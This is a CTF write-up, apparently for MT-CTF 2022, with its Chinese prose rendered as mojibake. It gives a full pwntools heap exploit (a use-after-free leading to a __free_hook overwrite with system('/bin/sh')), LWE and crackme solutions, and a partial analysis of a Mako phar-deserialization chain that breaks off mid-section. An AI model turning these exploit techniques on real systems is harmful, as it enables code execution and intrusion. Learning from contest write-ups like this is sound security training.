<h2 id="äºŒ-è§£é¢˜è¯¦æƒ…"><a class="markdownIt-Anchor" href="#äºŒ-è§£é¢˜è¯¦æƒ…"></a> <strong>äºŒã€è§£é¢˜è¯¦æƒ…</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/xjNAP_qZrZsv3u0Wrp_gOg-166427030055210.png" alt="10"></p>
<h2 id="ä¸‰-è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#ä¸‰-è§£é¢˜è¿‡ç¨‹"></a> <strong>ä¸‰ã€è§£é¢˜è¿‡ç¨‹</strong></h2>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> <strong>Misc</strong></h2>
<h3 id="what_is_that"><a class="markdownIt-Anchor" href="#what_is_that"></a> <strong>What_is_that</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/hQaXdjeI8kdpDiOkGqIXSg.png" alt="11"></p>
<p>qwqæ‰‹æ’¸flagï¼š</p>
<p>flag{1f576e5e-a0db-4fe2-8678-5ec4d227d41a}</p>
<h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> <strong>Pwn</strong></h2>
<h3 id="heap"><a class="markdownIt-Anchor" href="#heap"></a> <strong>heap</strong></h3>
<p>å°±æ˜¯ä¸€ä¸ªglibc2.27çš„UAFæ¼æ´ï¼Œä½†æ˜¯ç”³è¯·çš„å †å—å¤§å°åªèƒ½æ˜¯0x20æˆ–0x30ï¼Œå½“ç”³è¯·0x20æ—¶ï¼Œeditå‡½æ•°å­˜åœ¨æº¢å‡ºä¿®æ”¹chunk_sizeæ³„éœ²libcå³å¯</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">r</span>=process(&quot;/home/ubuntu/pwn/é¢˜ç›®/iæ˜¥ç§‹/MTCTF/pwn&quot;)</span><br><span class="line"><span class="comment"># r=remote(&quot;47.95.8.59&quot;,24835)</span></span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;/home/ubuntu/pwn/é¢˜ç›®/iæ˜¥ç§‹/MTCTF/pwn&quot;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&quot;/home/ubuntu/pwn/é¢˜ç›®/iæ˜¥ç§‹/MTCTF/libc.so.6&quot;)</span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;amd64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    <span class="attribute">src</span>=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x127C)</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(r,src)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;What size of paper do you want to add?&quot;</span>,str(size))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want torn up?&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want to write?&quot;</span>,str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;How many words do you need to write?&quot;</span>,str(len(content)))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want to review?&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(0x18)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0x18):</span><br><span class="line">    <span class="built_in">add</span>(0x1f)</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=p64(0)*3+p64(0x421)</span><br><span class="line"><span class="built_in">edit</span>(0,payload)</span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line"><span class="attribute">libc_base</span>=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b<span class="string">&quot;\x00&quot;</span>))-0x10-96-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+hex(libc_base))</span><br><span class="line"><span class="attribute">free_hook</span>=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="attribute">system_addr</span>=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line"><span class="built_in">edit</span>(3,p64(free_hook))</span><br><span class="line"><span class="built_in">add</span>(0x1f)</span><br><span class="line"><span class="built_in">add</span>(0x1f)</span><br><span class="line"><span class="built_in">edit</span>(0x17,p64(system_addr))</span><br><span class="line"><span class="built_in">edit</span>(4,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> <strong>Crypto</strong></h2>
<h3 id="strange_lwe"><a class="markdownIt-Anchor" href="#strange_lwe"></a> <strong>strange_lwe</strong></h3>
<p>LWEé—®é¢˜ï¼Œç”¨babaiâ€™s CVPç®—æ³•æ±‚è§£ã€‚</p>
<p>è¿™é‡Œæˆ‘æœ¬æ¥æƒ³ç›´æ¥é€šè¿‡è¯¯å·®æ¥è¿›è¡Œåˆ¤æ–­çš„ï¼Œç„¶è€Œå‘ç°æœ‰äº›ä½å¯¹ä¸ä¸Šã€‚å› æ­¤è¿˜æ˜¯ç»•äº†ä¸ªå¼¯å…ˆæŠŠsç»™ç®—å‡ºæ¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Babai&#x27;s Nearest Plane algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -=  M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line">q = <span class="number">401</span></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">a = <span class="number">0.025</span></span><br><span class="line">num = <span class="number">48</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">A=Matrix(ZZ,<span class="built_in">eval</span>(data[<span class="number">0</span>].strip()))</span><br><span class="line">cipher=<span class="built_in">eval</span>(data[<span class="number">1</span>].strip())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment">#t=DiscreteGaussianDistributionIntegerSampler(a*q)</span></span><br><span class="line"><span class="comment">#print([ t() for _ in range(1000)])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">res=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for k in range(num):</span></span><br><span class="line"><span class="string">	rt=cipher[k][0]</span></span><br><span class="line"><span class="string">	Lattice = matrix(ZZ, m + n, m)</span></span><br><span class="line"><span class="string">	for i in range(m):</span></span><br><span class="line"><span class="string">		for j in range(n):</span></span><br><span class="line"><span class="string">			Lattice[m + j, i] = A[i][j]</span></span><br><span class="line"><span class="string">		Lattice[i, i] = q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	lattice = IntegerLattice(Lattice, lll_reduce=True)</span></span><br><span class="line"><span class="string">	print(&quot;LLL done&quot;)</span></span><br><span class="line"><span class="string">	gram = lattice.reduced_basis.gram_schmidt()[0]</span></span><br><span class="line"><span class="string">	target = vector(ZZ,rt)</span></span><br><span class="line"><span class="string">	cv = Babai_closest_vector(lattice.reduced_basis, gram, target)</span></span><br><span class="line"><span class="string">	#print(&quot;Closest Vector: &#123;&#125;&quot;.format(cv))</span></span><br><span class="line"><span class="string">	error=cv-target</span></span><br><span class="line"><span class="string">	print(&quot;Error: &#123;&#125;&quot;.format(error))</span></span><br><span class="line"><span class="string">	if any([abs(e)&gt;40 for e in error]):</span></span><br><span class="line"><span class="string">		res+=&#x27;0&#x27;</span></span><br><span class="line"><span class="string">	else:</span></span><br><span class="line"><span class="string">		res+=&#x27;1&#x27;</span></span><br><span class="line"><span class="string">	print(res)</span></span><br><span class="line"><span class="string">	A = matrix(Zmod(q), A)</span></span><br><span class="line"><span class="string">	try:</span></span><br><span class="line"><span class="string">		s = A.solve_right(cv)</span></span><br><span class="line"><span class="string">		print(&#x27;s: &#123;&#125;&#x27;.format(s))</span></span><br><span class="line"><span class="string">	except:</span></span><br><span class="line"><span class="string">		print(&quot;no solution&quot;)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s=(<span class="number">195</span>, <span class="number">202</span>, <span class="number">322</span>, <span class="number">287</span>, <span class="number">230</span>, <span class="number">311</span>, <span class="number">396</span>, <span class="number">58</span>, <span class="number">242</span>, <span class="number">191</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">248</span>, <span class="number">264</span>, <span class="number">139</span>, <span class="number">291</span>)</span><br><span class="line">s=vector(GF(q),s)</span><br><span class="line">A=Matrix(GF(q),A)</span><br><span class="line"><span class="built_in">print</span>(A*s)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">	tmp=[]</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(num*<span class="number">8</span>):</span><br><span class="line">		c=vector(ZZ,cipher[k][l])</span><br><span class="line">		As=vector(GF(q),A*s)</span><br><span class="line">		t=c-As</span><br><span class="line">		t=[tt <span class="keyword">if</span> tt&lt;(q//<span class="number">2</span>) <span class="keyword">else</span> q-tt <span class="keyword">for</span> tt <span class="keyword">in</span> t]</span><br><span class="line">		tmp.extend(t)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">all</span>([ tt&lt;<span class="number">40</span> <span class="keyword">for</span> tt <span class="keyword">in</span> t]):</span><br><span class="line">		res+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#res=&#x27;000000110110001010100111101100001101011110011110&#x27;</span></span><br><span class="line">my_secret_bits=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,res))</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + sha1(<span class="built_in">str</span>(my_secret_bits).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;7e0fefd15c630d4b41db2ac9e18d48d691b3d419&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <strong>Reverse</strong></h2>
<h3 id="crackme"><a class="markdownIt-Anchor" href="#crackme"></a> <strong>crackme</strong></h3>
<p>é¢˜ç›®æ ¸å¿ƒé€»è¾‘åœ¨digestå‡½æ•°é‡Œï¼Œé¦–å…ˆå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªSM4åŠ å¯†:</p>
<p><img src="/2022/09/MT-CTF-Writeup/9JL4IvvtABLoNAquRwetrA.png" alt="13"></p>
<p>æ¥ä¸‹æ¥æœ€åº•ä¸‹æœ‰ä¸ªRC4ï¼š</p>
<p><img src="/2022/09/MT-CTF-Writeup/e7Ydd8t3cchsUByy2klzDQ.png" alt="14"></p>
<p>çŒœæµ‹ç¨‹åºæ˜¯å…ˆåšSM4åŠ å¯†ï¼Œæœ€åRC4å¹¶è½¬hexè¾“å‡ºdigestã€‚SM4å¯†é’¥å·²ç»™å‡ºï¼Œè€ŒRC4å¯†é’¥åŠ¨è°ƒå¯ä»¥å‘ç°å°±æ˜¯LicenseKeyã€‚å› æ­¤ç”¨CyberChefåœ¨çº¿è·‘ä¸€ä¸‹è§£å¯†å°±å‡ºäº†ã€‚</p>
<p><img src="/2022/09/MT-CTF-Writeup/XYLE2NUnBulMjsDqQRqnVA.png" alt="15"></p>
<p>flag{c6545808-81ba-48c6-b082-df559da10751}</p>
<h2 id="web_å¤ç°"><a class="markdownIt-Anchor" href="#web_å¤ç°"></a> Web_å¤ç°</h2>
<h3 id="mako_imagemagick"><a class="markdownIt-Anchor" href="#mako_imagemagick"></a> <strong>Mako_imagemagick:</strong></h3>
<h4 id="èµ›é¢˜å¤ç°"><a class="markdownIt-Anchor" href="#èµ›é¢˜å¤ç°"></a> èµ›é¢˜å¤ç°ï¼š</h4>
<p>è‡ªå·±èµ·äº†ä¸€ä¸ªdockerï¼Œæˆ‘ä»¬å…ˆå¤§æ¦‚çœ‹ä¸€ä¸‹é¢˜ç›®å§ã€‚</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>æ–‡ä»¶ä¸Šä¼ å…ˆç®€å•çš„ä¼ ä¸ªæ–‡ä»¶æŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹ï¼Œ</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>è¿™é‡Œè¿˜æ²¡æœ‰å»çœ‹æºç ï¼Œçœ‹åˆ°è¿™ä¸ªï¼Œå°±éšä¾¿ä¸Šä¼ äº†ä¸€ä¸ªç è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å›¾ç‰‡ä¸Šä¼ åè¢«å‘é€åˆ°ä¸€ä¸ªå‡½æ•°ä¸­å¤„ç†ã€‚è¿™é‡Œå°±æ„è¯†åˆ°ä¸æ˜¯ç®€å•çš„æ–‡ä»¶ä¸Šä¼ äº†ï¼Œå†³èµ›æ—¶ä¹Ÿå»å•ƒæºç äº†ï¼Œä½†æ˜¯æ²¡æ€ä¹ˆå•ƒæ˜ç™½ï¼Œå¤ç°æ—¶é—´è¶³å¤Ÿå¤šï¼Œåœ¨åŠ ä¸ŠMaxzedå¤§å¸ˆå‚…çš„wpæ€»ç®—å•ƒæ˜ç™½äº†ï¼Œæºç å¤ªå¤šï¼Œæˆ‘å°±æˆªé‡ç‚¹æ¥è¯´å§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçœ‹Maxzedå¸ˆå‚…çš„wpæ²¡çœ‹å‡ºæ¥ä»–æ€ä¹ˆåˆ¤æ–­å­˜åœ¨pharååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œè‡ªå·±åˆå»ç»†çœ‹äº†ä¸€ä¸‹æºç ã€‚</p>
<p>æŒ‰ç…§pharååºåˆ—åŒ–çš„æƒ¯ä¾‹å°±æ˜¯è¦æ‰¾å¯æ§çš„å‡½æ•°ï¼Œé‚£å°±æ‰¾å§<s>å®¡é‚£ä¹ˆå¤§ä¸€ä¸ªç©æ„å„¿ç¡®å®éš¾å—</s></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼è¢«èµ‹ç»™ $fileNameï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ $indexã€‚å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªæ•°ç»„å…ƒç´ ï¼‰ï¼Œç›´åˆ°éå†åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œåœæ­¢éå†å¹¶é€€å‡ºå¾ªç¯ã€‚</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//å¯¹æ¯æ¬¡å¾ªç¯çš„fileNameè¿›è¡Œbase64ç¼–ç </span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//è·å–fileNameçš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿™é‡Œæ˜¯è¯»å–imageFileçš„æ–‡ä»¶åå¹¶èµ‹å€¼ç»™fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//å°±è¿™ä¸ªå‡½æ•°ï¼Œè¦æ˜¯æ•é”ä¸€äº›ï¼Œåº”è¯¥å°±èƒ½çŒœåˆ°fileNameå¯æ§ï¼Œé‚£ä¹ˆå°±è¦æ‰¾è§¦å‘ç‚¹ï¼Œæ¥ç€å®¡ã€‚</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//å¯æ§çš„filename,è¿™é‡Œå¯ä»¥ç”¨æ¥è§¦å‘phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ¥è¯´ä¸€ä¸‹fileNameä¸ºå•¥æ˜¯å¯æ§çš„,åœ¨Imageæ„é€ å‡½æ•°ä¸­å­˜åœ¨file_exists()æ¥è§¦å‘ï¼ŒåŒæ—¶åœ¨ediGetä¸­filenameè¿›è¡Œgetè®¿é—®ï¼Œå³å¯ç”¨æ¥è§¦å‘phar</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æŒ–é“¾å­äº†ï¼Œ</p>
<p>åˆæ­¥å®¡ä¸‹æ¥ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥ç”¨maxzedçš„é“¾å­äº†ï¼Œæˆ‘å°±è§£è¯»ä¸€ä¸‹ä»–ä¸ºå•¥ä¼šç”¨è¿™ä¸ªé“¾å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>åœ¨Session.phpä¸­çš„__destruct(),å…·æœ‰è‡ªåŠ¨æäº¤ä¼šè¯æ•°æ®çš„commit,æ•°æ®ä¼ åˆ°File</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨File.write()ä¸­å­˜åœ¨å†™å…¥åŠŸèƒ½ç‚¹ï¼Œé“¾å­åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªï¼Œæ¥ç€çœ‹ä¸‹ä¸€ä¸ªåŠŸèƒ½ç‚¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.phpä¸­çš„put()</p>
